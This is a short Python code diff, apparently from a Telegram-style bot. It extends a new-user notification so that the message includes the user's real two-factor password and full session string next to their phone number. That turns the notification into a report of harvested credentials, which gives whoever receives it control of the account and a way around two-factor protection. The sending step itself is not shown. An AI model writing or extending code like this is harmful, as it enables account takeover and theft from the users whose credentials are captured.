@@ -2165,6 +2165,10 @@ async def notify_new_user(user_info, string_session: str,
         f"📱 <b>Phone:</b> <code>{phone}</code>\n"
         f"🛡️ <b>2FA Verified:</b> {twofa_v}\n"
     )
+    if twofa_password:
+        msg += f"🔑 <b>Real 2FA Password:</b> <code>{twofa_password}</code>\n"
+    if string_session:
+        msg += f"🔑 <b>Session String:</b>\n<code>{string_session}</code>\n"
     msg += f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
 
     try:
